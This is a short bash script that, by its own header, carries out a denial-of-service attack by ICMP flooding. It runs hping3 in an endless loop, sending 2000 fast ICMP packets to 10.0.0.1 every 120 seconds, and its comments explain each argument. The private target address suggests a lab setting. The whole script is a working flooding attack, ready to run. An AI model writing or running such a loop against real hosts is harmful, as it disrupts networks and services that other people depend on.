#!/bin/bash
#
# implements the Dos attack via ICMP flooding

# PID=$! gets the process id of the last process put to background

while true 
do 
    hping3 --icmp --faster -o 44140 10.0.0.1 -c 2000 & 
    sleep 120
done

# hping3 command explained argument-for-argument
## --icmp: ICMP mode/protocol to use: ICMP
## --faster: alias for -i u1000 (100 packets for second)
## -o 44140:  
## 10.0.0.1: target host=10.0.0.1
## -c 2000: packet count=2000
